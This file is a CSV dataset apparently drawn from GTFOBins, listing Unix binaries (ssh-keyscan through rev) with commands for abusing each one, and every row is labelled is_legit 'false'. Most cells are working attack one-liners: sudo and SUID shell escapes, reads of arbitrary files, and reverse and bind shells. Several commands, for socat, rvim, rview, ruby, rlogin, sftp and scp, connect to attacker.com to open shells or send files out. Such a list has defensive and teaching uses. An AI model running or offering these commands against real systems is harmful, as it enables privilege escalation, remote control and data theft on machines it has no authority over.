"Name","functions","functions_shell","functions_shell_description","functions_shell_code","functions_sudo","functions_sudo_description","functions_sudo_code","description","functions_file-read","functions_file-read_code","functions_suid","functions_suid_code","functions_file-write","functions_file-write_code","functions_limited-suid","functions_limited-suid_code","functions_file-download","functions_file-download_description","functions_file-download_code","functions_file-read_description","functions_suid_description","functions_non-interactive-reverse-shell","functions_non-interactive-reverse-shell_description","functions_non-interactive-reverse-shell_code","functions_command","functions_command_description","functions_command_code","functions_file-upload","functions_file-upload_description","functions_file-upload_code","functions_file-write_description","functions_reverse-shell","functions_reverse-shell_description","functions_reverse-shell_code","functions_non-interactive-bind-shell","functions_non-interactive-bind-shell_description","functions_non-interactive-bind-shell_code","functions_library-load","functions_library-load_description","functions_library-load_code","functions_capabilities","functions_capabilities_description","functions_capabilities_code","functions_limited-suid_description","functions_bind-shell","functions_bind-shell_description","functions_bind-shell_code","is_legit"
"ssh-keyscan","","","","","","LFILE=file_to_read sudo ssh-keyscan -f $LFILE","The file content is actually parsed so only a part of each line is returned as a part of an error message.","","LFILE=file_to_read ssh-keyscan -f $LFILE","","LFILE=file_to_read ./ssh-keyscan -f $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ssh-keygen","","","","","","sudo ssh-keygen -D ./lib.so","","","","","./ssh-keygen -D ./lib.so","","","","","","","","","","","","","","","","","","","","","","","","","","","","ssh-keygen -D ./lib.so","","","","","","","","false"
"ssh-agent","","","ssh-agent /bin/sh","","","sudo ssh-agent /bin/","","","","","./ssh-agent /bin/ -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ss","","","","","","LFILE=file_to_read sudo ss -a -F $LFILE","The file content is actually parsed so only a part of the first line is returned as a part of an error message.","","LFILE=file_to_read ss -a -F $LFILE","","LFILE=file_to_read ./ss -a -F $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"sqlmap","","","sqlmap -u 127.0.0.1 --eval=""import os; os.system('/bin/sh')""","","","sudo sqlmap -u 127.0.0.1 --eval=""import os; os.system('/bin/sh')""","This allows to execute [`python`](/gtfobins/python/) code, other functions may apply.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"sqlite3","","","sqlite3 /dev/null '.shell /bin/sh'","","","sudo sqlite3 /dev/null '.shell /bin/sh'","","","LFILE=file_to_read sqlite3 << EOF CREATE TABLE t(line TEXT); .import $LFILE t SELECT * FROM t; EOF","","LFILE=file_to_read sqlite3 << EOF CREATE TABLE t(line TEXT); .import $LFILE t SELECT * FROM t; EOF","","LFILE=file_to_write sqlite3 /dev/null -cmd "".output $LFILE"" 'select ""DATA"";'","","./sqlite3 /dev/null '.shell /bin/sh'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"split","","The shell prompt is not printed.","split --filter=/bin/sh /dev/stdin","","The shell prompt is not printed.","sudo split --filter=/bin/sh /dev/stdin","","","LFILE=file_to_read TF=$(mktemp) split $LFILE $TF cat $TF*","","","","[''TF=$(mktemp) echo DATA >$TF split -b999m $TF ''-|-''EXT=.xxx TF=$(mktemp) echo DATA >$TF split -b999m --additional-suffix $EXTENSION $TF '']","","","","","","","","","","","","[''Command execution using an existing or newly created file.''-|-''Command execution using stdin (and close it directly).'']","[''COMMAND=id TF=$(mktemp) split --filter=$COMMAND $TF ''-|-''COMMAND=id echo | split --filter=$COMMAND /dev/stdin '']","","","","[''Data will be written in the current directory in a file named `xaa` by default. The input file will be split in multiple smaller files unless the `-b` option is used, pick a value in MB big enough.''-|-''GNU version only. Data will be written in the current directory in a file named `xaa.xxx` by default. The input file will be split in multiple smaller files unless the `-b` option is used, pick a value in MB big enough.'']","","","","","","","","","","","","","","","","","false"
"sort","","","","","","LFILE=file_to_read sudo sort -m ""$LFILE""","","","LFILE=file_to_read sort -m ""$LFILE""","","LFILE=file_to_read ./sort -m ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"softlimit","","","softlimit /bin/sh","","","sudo softlimit /bin/sh","","","","","./softlimit /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"soelim","","","","","","LFILE=file_to_read sudo soelim ""$LFILE""","The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files.","","LFILE=file_to_read soelim ""$LFILE""","","LFILE=file_to_read ./soelim ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"socket","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","RHOST=attacker.com RPORT=12345 socket -qvp '/bin/sh -i' $RHOST $RPORT","","","","","","","","","","","","Run `nc target.com 12345` on the attacker box to connect to the shell.","LPORT=12345 socket -svp '/bin/sh -i' $LPORT","false"
"socat","","The resulting shell is not a proper TTY shell and lacks the prompt.","socat stdin exec:/bin/sh","","The resulting shell is not a proper TTY shell and lacks the prompt.","sudo socat stdin exec:/bin/sh","","","LFILE=file_to_read socat -u ""file:$LFILE"" -","","","","LFILE=file_to_write socat -u 'exec:echo DATA' ""open:$LFILE,creat""","","RHOST=attacker.com RPORT=12345 ./socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane","","Run ``socat -u file:file_to_send tcp-listen:12345,reuseaddr`` on the attacker box to send the file.","RHOST=attacker.com RPORT=12345 LFILE=file_to_save socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat","","","","","","","","","","Run ``socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat`` on the attacker box to collect the file.","RHOST=attacker.com RPORT=12345 LFILE=file_to_send socat -u file:$LFILE tcp-connect:$RHOST:$RPORT","","","Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.","RHOST=attacker.com RPORT=12345 socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane","","","","","","","","","","Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.","","Run ``socat FILE:`tty`,raw,echo=0 TCP:target.com:12345`` on the attacker box to connect to the shell.","LPORT=12345 socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane","false"
"snap","","","","","It runs commands using a specially crafted Snap package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` COMMAND=id cd $(mktemp -d) mkdir -p meta/hooks printf '#!/bin/sh\n%s; false' ""$COMMAND"" >meta/hooks/install chmod +x meta/hooks/install fpm -n xxxx -s dir -t snap -a all meta ```","sudo snap install xxxx_1.0_all.snap --dangerous --devmode","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"smbclient","","","smbclient '\\attacker\share' !/bin/sh","","","sudo smbclient '\\attacker\share' !/bin/sh","A valid SMB/CIFS server must be available.","","","","","","","","","","Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to send the file.","smbclient '\\attacker\share' -c 'put file_to_send where_to_save'","","","","","","","","","","Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to collect the file.","smbclient '\\attacker\share' -c 'put file_to_send where_to_save'","","","","","","","","","","","","","","","","","","false"
"slsh","","","slsh -e 'system(""/bin/sh"")'","","","sudo slsh -e 'system(""/bin/sh"")'","","","","","","","","","./slsh -e 'system(""/bin/sh"")'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"shuf","","","","","The written file content is corrupted by adding a newline.","LFILE=file_to_write sudo shuf -e DATA -o ""$LFILE""","","","LFILE=file_to_read shuf -z ""$LFILE""","","LFILE=file_to_write ./shuf -e DATA -o ""$LFILE""","","LFILE=file_to_write shuf -e DATA -o ""$LFILE""","","","","","","The read file content is corrupted by randomizing the order of NUL terminated strings.","The written file content is corrupted by adding a newline.","","","","","","","","","","The written file content is corrupted by adding a newline.","","","","","","","","","","","","","","","","","false"
"sg","","Commands can be run if the current user's group is specified, therefore no additional permissions are needed.","sg $(id -ng)","","","sudo sg root","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"sftp","","","HOST=user@attacker.com sftp $HOST !/bin/sh","","","HOST=user@attacker.com sudo sftp $HOST !/bin/sh","","","","","","","","","","","Fetch a remote file from a SSH server.","RHOST=user@attacker.com sftp $RHOST get file_to_get file_to_save","","","","","","","","","","Send local file to a SSH server.","RHOST=user@attacker.com sftp $RHOST put file_to_send file_to_save","","","","","","","","","","","","","","","","","","false"
"setlock","","","TF=$(mktemp) setlock $TF /bin/sh","","","sudo setlock - /bin/sh","","","","","./setlock - /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"setfacl","","","","","","LFILE=file_to_change USER=somebody sudo setfacl -m -u:$USER:rwx $LFILE","This can be run with elevated privileges to change ownership and then read, write, or execute a file.","","","","LFILE=file_to_change USER=somebody ./setfacl -m u:$USER:rwx $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"setarch","","","setarch $(arch) /bin/sh","","","sudo setarch $(arch) /bin/sh","The `uname -m` command can be used in place of `arch` to obtain the architecture.","","","","./setarch $(arch) /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"service","","","/usr/sbin/service ../../bin/sh","","","sudo service ../../bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"sed","","[''GNU version only. Also, this requires `bash`.''-|-''GNU version only. The resulting shell is not a proper TTY shell.'']","[''sed -n '1e exec sh 1>&0' /etc/hosts''-|-''sed e'']","","GNU version only. Also, this requires `bash`.","sudo sed -n '1e exec sh 1>&0' /etc/hosts","","","LFILE=file_to_read sed '' ""$LFILE""","","LFILE=file_to_read ./sed -e '' ""$LFILE""","","LFILE=file_to_write sed -n ""1s/.*/DATA/w $LFILE"" /etc/hosts","","","","","","","","","","","","GNU version only.","sed -n '1e id' /etc/hosts","","","","","","","","","","","","","","","","","","","","","false"
"scrot","","","scrot -e /bin/sh","","","sudo scrot -e /bin/sh","This requires a running X server.","","","","","","","","./scrot -e /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"script","","","script -q /dev/null","","","sudo script -q /dev/null","","","","","","","script -q -c 'echo DATA' file_to_write","","","","","","","","","","","","","","","","","The wrote content is corrupted by debug prints.","","","","","","","","","","","","","","","","","false"
"screen","","","screen","","","sudo screen","","","","","","","[''LFILE=file_to_write screen -L -Logfile $LFILE echo DATA ''-|-''LFILE=file_to_write screen -L $LFILE echo DATA '']","","","","","","","","","","","","","","","","","[''This works on screen version 4.06.02. Data is appended to the file and `\n` is converted to `\r\n`.''-|-''This works on screen version 4.05.00. Data is appended to the file and `\n` is converted to `\r\n`.'']","","","","","","","","","","","","","","","","","false"
"scp","","","TF=$(mktemp) echo 'sh 0<&2 1>&2' > $TF chmod +x ""$TF"" scp -S $TF x y:","","","TF=$(mktemp) echo 'sh 0<&2 1>&2' > $TF chmod +x ""$TF"" sudo scp -S $TF x y:","","","","","","","","","TF=$(mktemp) echo 'sh 0<&2 1>&2' > $TF chmod +x ""$TF"" ./scp -S $TF a b:","","Fetch a remote file from a SSH server.","RPATH=user@attacker.com:~/file_to_get LFILE=file_to_save scp $RPATH $LFILE","","","","","","","","","","Send local file to a SSH server.","RPATH=user@attacker.com:~/file_to_save LPATH=file_to_send scp $LFILE $RPATH","","","","","","","","","","","","","","","","","","false"
"scanmem","","","scanmem shell /bin/sh","","","sudo scanmem shell /bin/sh","","","","","./scanmem shell /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"sash","","","sash","","","sudo sash","","","","","./sash","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"rvim","","[''This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.''-|-''This requires that `rvim` is compiled with Lua support.'']","[''rvim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'''-|-''rvim -c ':lua os.execute(""reset; exec sh"")''']","","[''This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.''-|-''This requires that `rvim` is compiled with Lua support.'']","[''sudo rvim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'''-|-''sudo rvim -c ':lua os.execute(""reset; exec sh"")''']","","","rvim file_to_read","","./rvim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'","","rvim file_to_write iDATA ^[ w","","./rvim -c ':lua os.execute(""reset; exec sh"")'","","[''This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.''-|-''Fetch a remote file via TCP. Run `nc target.com 12345 < ""file_to_send""` on the attacker box to send the file. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.'']","[''export URL=http://attacker.com/file_to_get export LFILE=file_to_save rvim -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve(e[""URL""], e[""LFILE""]) vim.command("":q!"")' ''-|-''export LPORT=12345 export LFILE=file_to_save rvim -c ':lua local k=require(""socket"");   local s=assert(k.bind(""*"",os.getenv(""LPORT"")));   local c=s:accept();   local d,x=c:receive(""*a"");   c:close();   local f=io.open(os.getenv(""LFILE""), ""wb"");   f:write(d);   io.close(f);' '']","","This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.","","Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.","export RHOST=attacker.com export RPORT=12345 rvim -c ':lua local s=require(""socket""); local t=assert(s.tcp());   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));   while true do     local r,x=t:receive();local f=assert(io.popen(r,""r""));     local b=assert(f:read(""*a""));t:send(b);   end;   f:close();t:close();'","","","","","[''This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.''-|-''This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.''-|-''Send a local file via TCP. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.'']","[''export URL=http://attacker.com/ export LFILE=file_to_send rvim -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u else: import urllib as u, urllib2 as r r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode())) vim.command("":q!"")' ''-|-''export LPORT=8888 rvim -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import http.server as s, socketserver as ss else: import SimpleHTTPServer as s, SocketServer as ss ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever() vim.command("":q!"")' ''-|-''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_send rvim -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')   local d=f:read(""*a"")   io.close(f);   local s=require(""socket"");   local t=assert(s.tcp());   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));   t:send(d);   t:close();' '']","","","This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 rvim -c ':py import vim,sys,socket,os,pty;s=socket.socket() s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT"")))) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(""/bin/sh"") vim.command("":q!"")'","","Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.","export LPORT=12345 rvim -c ':lua local k=require(""socket"");   local s=assert(k.bind(""*"",os.getenv(""LPORT"")));   local c=s:accept();   while true do     local r,x=c:receive();local f=assert(io.popen(r,""r""));     local b=assert(f:read(""*a""));c:send(b);   end;c:close();f:close();'","","This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.","rvim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'","","This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.","./rvim -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'","This requires that `rvim` is compiled with Lua support.","","","","false"
"rview","","[''This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.''-|-''This requires that `rview` is compiled with Lua support.'']","[''rview -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'''-|-''rview -c ':lua os.execute(""reset; exec sh"")''']","","[''This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.''-|-''This requires that `rview` is compiled with Lua support.'']","[''sudo rview -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'''-|-''sudo rview -c ':lua os.execute(""reset; exec sh"")''']","","","rview file_to_read","","./rview -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'","","rview file_to_write iDATA ^[ w!","","./rview -c ':lua os.execute(""reset; exec sh"")'","","[''This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.''-|-''Fetch a remote file via TCP. Run `nc target.com 12345 < ""file_to_send""` on the attacker box to send the file. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.'']","[''export URL=http://attacker.com/file_to_get export LFILE=file_to_save rview -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve(e[""URL""], e[""LFILE""]) vim.command("":q!"")' ''-|-''export LPORT=12345 export LFILE=file_to_save rview -c ':lua local k=require(""socket"");   local s=assert(k.bind(""*"",os.getenv(""LPORT"")));   local c=s:accept();   local d,x=c:receive(""*a"");   c:close();   local f=io.open(os.getenv(""LFILE""), ""wb"");   f:write(d);   io.close(f);' '']","","This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.","","Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.","export RHOST=attacker.com export RPORT=12345 rview -c ':lua local s=require(""socket""); local t=assert(s.tcp());   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));   while true do     local r,x=t:receive();local f=assert(io.popen(r,""r""));     local b=assert(f:read(""*a""));t:send(b);   end;   f:close();t:close();'","","","","","[''This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.''-|-''This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.''-|-''Send a local file via TCP. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.'']","[''export URL=http://attacker.com/ export LFILE=file_to_send rview -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u else: import urllib as u, urllib2 as r r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode())) vim.command("":q!"")' ''-|-''export LPORT=8888 rview -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import http.server as s, socketserver as ss else: import SimpleHTTPServer as s, SocketServer as ss ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever() vim.command("":q!"")' ''-|-''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_send rview -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')   local d=f:read(""*a"")   io.close(f);   local s=require(""socket"");   local t=assert(s.tcp());   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));   t:send(d);   t:close();' '']","","","This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 rview -c ':py import vim,sys,socket,os,pty;s=socket.socket() s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT"")))) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(""/bin/sh"") vim.command("":q!"")'","","Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.","export LPORT=12345 rview -c ':lua local k=require(""socket"");   local s=assert(k.bind(""*"",os.getenv(""LPORT"")));   local c=s:accept();   while true do     local r,x=c:receive();local f=assert(io.popen(r,""r""));     local b=assert(f:read(""*a""));c:send(b);   end;c:close();f:close();'","","This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.","rview -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'","","This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.","./rview -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'","This requires that `rview` is compiled with Lua support.","","","","false"
"runscript","","","TF=$(mktemp) echo '! exec /bin/sh' >$TF runscript $TF","","","TF=$(mktemp) echo '! exec /bin/sh' >$TF sudo runscript $TF","","","","","","","","","TF=$(mktemp) echo '! exec /bin/sh' >$TF ./runscript $TF","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"run-parts","","","run-parts --new-session --regex '^sh$' /bin","","","sudo run-parts --new-session --regex '^sh$' /bin","","","","","./run-parts --new-session --regex '^sh$' /bin --arg='-p'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"run-mailcap","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","run-mailcap --action=view /etc/hosts !/bin/sh","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","sudo run-mailcap --action=view /etc/hosts !/bin/sh","","","run-mailcap --action=view file_to_read","","","","run-mailcap --action=edit file_to_read","","","","","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","","","","","","","","","","","The file must exist and be not empty.  This invokes the default editor, which is likely to be [`vi`](/gtfobins/vi/), other functions may apply.","","","","","","","","","","","","","","","","","false"
"ruby","","","ruby -e 'exec ""/bin/sh""'","","","sudo ruby -e 'exec ""/bin/sh""'","","","ruby -e 'puts File.read(""file_to_read"")'","","","","ruby -e 'File.open(""file_to_write"", ""w+"") { |f| f.write(""DATA"") }'","","","","Fetch a remote file via HTTP GET request.","export URL=http://attacker.com/file_to_get export LFILE=file_to_save ruby -e 'require ""open-uri""; download = open(ENV[""URL""]); IO.copy_stream(download, ENV[""LFILE""])'","","","","","","","","","","Serve files in the local folder running an HTTP server. This requires version 1.9.2 or later.","export LPORT=8888 ruby -run -e httpd . -p $LPORT","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[""RHOST""],ENV[""RPORT""]);while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read}end'","","","","","","ruby -e 'require ""fiddle""; Fiddle.dlopen(""lib.so"")'","","","./ruby -e 'Process::Sys.setuid(0); exec ""/bin/sh""'","","","","","false"
"rtorrent","","","echo ""execute = /bin/sh,-c,\""/bin/sh <$(tty) >$(tty) 2>$(tty)\"""" >~/.rtorrent.rc rtorrent","","","","","","","","echo ""execute = /bin/sh,-p,-c,\""/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"""" >~/.rtorrent.rc ./rtorrent","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"rsync","","","rsync -e 'sh -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null","","","sudo rsync -e 'sh -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null","","","","","./rsync -e 'sh -p -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"rpmverify","","","rpmverify --eval '%(/bin/sh 1>&2)'","","","sudo rpmverify --eval '%(/bin/sh 1>&2)'","","","","","","","","","./rpmverify --eval '%(/bin/sh 1>&2)'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"rpmquery","","","rpmquery --eval '%{lua:posix.exec(""/bin/sh"")}'","","","sudo rpmquery --eval '%{lua:posix.exec(""/bin/sh"")}'","","","","","","","","","./rpmquery --eval '%{lua:os.execute(""/bin/sh"")}'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"rpmdb","","","rpmdb --eval '%(/bin/sh 1>&2)'","","","sudo rpmdb --eval '%(/bin/sh 1>&2)'","","","","","","","","","./rpmdb --eval '%(/bin/sh 1>&2)'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"rpm","","","[''rpm --eval '%{lua:os.execute(""/bin/sh"")}'''-|-''rpm --pipe '/bin/sh 0<&1''']","","It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` TF=$(mktemp -d) echo 'id' > $TF/x.sh fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF ```","[''sudo rpm --eval '%{lua:os.execute(""/bin/sh"")}'''-|-''sudo rpm -ivh x-1.0-1.noarch.rpm'']","","","","","","","","","./rpm --eval '%{lua:os.execute(""/bin/sh"")}'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"rlwrap","","","rlwrap /bin/sh","","","sudo rlwrap /bin/sh","","","","","./rlwrap -H /dev/null /bin/sh -p","","LFILE=file_to_write rlwrap -l ""$LFILE"" echo DATA","","","","","","","","","","","","","","","","","This adds timestamps to the output file. This relies on the external `echo` command.","","","","","","","","","","","","","","","","","false"
"rlogin","","","","","","","Usually `rlogin` is a symlink to `ssh`, the following works only when the *real* `rlogin` is used (e.g., from the `rsh-client` APT package).","","","","","","","","","","","","","","","","","","","","","Send contents of a file to a TCP port. Run `nc -l -p 12345 > ""file_to_save""` on the attacker system to capture the contents.  `rlogin` hangs waiting for the remote peer to close the socket.  The file is corrupted by leading and trailing spurious data.","RHOST=attacker.com RPORT=12345 LFILE=file_to_send rlogin -l ""$(cat $LFILE)"" -p $RPORT $RHOST","","","","","","","","","","","","","","","","","","false"
"rev","","","","","","LFILE=file_to_read sudo rev $LFILE | rev","","","LFILE=file_to_read rev $LFILE | rev","","LFILE=file_to_read ./rev $LFILE | rev","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
